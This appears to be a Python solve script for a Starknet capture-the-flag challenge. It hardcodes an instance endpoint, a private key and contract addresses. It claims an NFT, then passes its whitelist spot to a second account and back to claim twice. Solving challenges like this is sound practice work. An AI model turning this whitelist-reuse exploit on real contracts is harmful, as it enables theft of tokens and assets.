# Usage:
import asyncio
import json
import os
import subprocess
from pathlib import Path

from starknet_py.contract import Contract
from starknet_py.net import AccountClient
from starknet_py.net.gateway_client import GatewayClient
from starknet_py.net.signer.stark_curve_signer import KeyPair
from starkware.starknet.definitions.general_config import StarknetChainId
from starkware.starknet.public.abi import get_selector_from_name

uuid = "066e1639-c067-47aa-8b99-9a215c39ed6d"
endpoint = "http://066e1639-c067-47aa-8b99-9a215c39ed6d@18.157.198.111:5059"
private_key = "0x831661e97010a5e411e9691ca9fc77af"
player_address = "0x4d03dc8af76603d45ea26585ce466f024fec60ec8d0bf6123374da08026ae68"
contract_address = "0x7fc9165172d4965ba611a08198d093dd1da73f80f796ddd7612087d7aa2f255"

private_key = int(private_key, 16)
player_address = int(player_address, 16)


def int_to_uint256(value):
    low = value & ((1 << 128) - 1)
    high = value >> 128
    return {"low": low, "high": high}


async def run():

    gateway_client = GatewayClient(net=endpoint, chain=StarknetChainId.TESTNET)
    account_client = AccountClient(
        address=player_address,
        client=gateway_client,
        chain=StarknetChainId.TESTNET,
        key_pair=KeyPair.from_private_key(private_key),
        supported_tx_version=1,
    )

    contract = await Contract.from_address(contract_address, account_client)

    punk_nft_address = (await contract.functions["getPunksNftAddress"].call()).address
    (await contract.functions["owner"].call()).address
    punk_contract = await Contract.from_address(punk_nft_address, account_client)
    await punk_contract.functions["balanceOf"].call(player_address)

    tx = await contract.functions["claim"].invoke(player_address, max_fee=int(1e16))
    await tx.wait_for_acceptance()

    await punk_contract.functions["balanceOf"].call(player_address)
    user_1 = await AccountClient.create_account(gateway_client)

    tx = await contract.functions["transferWhitelistSpot"].invoke(
        user_1.address, max_fee=int(1e16)
    )
    await tx.wait_for_acceptance()

    eth_contract = await Contract.from_address(
        "0x62230ea046a9a5fbc261ac77d03c8d41e5d442db2284587570ab46455fd2488",
        account_client,
    )
    balance = (await eth_contract.functions["balanceOf"].call(player_address)).balance
    tx = await eth_contract.functions["transfer"].invoke(
        user_1.address, int_to_uint256(balance // 2), max_fee=int(1e16)
    )

    contract = await Contract.from_address(contract_address, user_1)
    tx = await contract.functions["transferWhitelistSpot"].invoke(
        player_address, max_fee=int(1e16)
    )
    await tx.wait_for_acceptance()

    contract = await Contract.from_address(contract_address, account_client)
    tx = await contract.functions["claim"].invoke(player_address, max_fee=int(1e16))
    await tx.wait_for_acceptance()

    await punk_contract.functions["balanceOf"].call(player_address)


if __name__ == "__main__":
    asyncio.run(run())
